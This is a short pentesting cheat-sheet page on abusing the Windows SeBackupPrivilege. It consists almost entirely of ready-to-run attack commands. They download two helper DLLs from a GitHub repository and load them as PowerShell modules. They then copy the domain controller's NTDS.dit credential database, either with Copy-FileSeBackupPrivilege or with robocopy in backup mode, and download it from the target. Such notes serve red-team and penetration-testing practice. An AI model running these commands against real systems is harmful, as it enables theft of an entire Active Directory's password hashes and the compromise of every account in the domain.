# Privilege Abuse

## Description

## Useful Commands

### SeBackupPrivilege

* [github.com/giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)

```
wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll

upload SeBackupPrivilegeCmdLets.dll
upload SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll
Copy-FileSeBackupPrivilege W:\Windows\NTDS\ntds.dit C:\Users\snovvcrash\Documents\ntds.dit -Overwrite
download ntds.dit
```

#### robocopy

```
PS > cmd /c where robocopy
PS > robocopy /B W:\Windows\NTDS\ntds.dit C:\Users\snovvcrash\Documents\ntds.dit
```



